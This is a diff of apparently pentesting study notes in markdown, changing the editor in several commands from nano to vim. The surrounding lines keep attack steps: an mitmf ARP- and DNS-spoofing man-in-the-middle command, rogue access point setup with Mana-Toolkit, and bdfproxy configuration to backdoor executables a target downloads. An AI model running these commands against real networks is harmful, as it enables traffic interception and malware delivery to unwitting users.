@@ -262,7 +262,7 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `service apache2 start`
   * The content of the page is in `/var/www/html`
 * Edit DNS settings
-  * `nano /etc/mitmf/mitmf.conf`
+  * `vim /etc/mitmf/mitmf.conf`
   * Edit the `A` record, that is responsible for translate names to IP adresses
 * Become the MITM
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
@@ -298,8 +298,8 @@ For this to work, you need a wireless adapter to broadcast the signal and a inte
 * Install Mana-Toolkit
   * `apt install mana-toolkit`
 * Edit the files below. Change the interface and the ssid. Then, change the upstream (internet) and the phy (broadcaster).
-  * `nano /etc/mana-toolkit/hostpad-mana.conf`
-  * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
+  * `vim /etc/mana-toolkit/hostpad-mana.conf`
+  * `vim /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 * Start the network
   * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 
@@ -453,7 +453,7 @@ Backdoor any .exe file that the target downloads using the Backdoor Factory Prox
 We need to be in the middle of the connection.
 
 * Edit bdfproxy config file and set your IP address and proxy mode to transparent
-  * ` nano /etc/bdfproxy/bdfproxy.cfg`
+  * ` vim /etc/bdfproxy/bdfproxy.cfg`
 * Start bdfproxy
   * `bdfproxy`
 * Redirect traffic to bdfoxy (the proxy is running on port 8080)
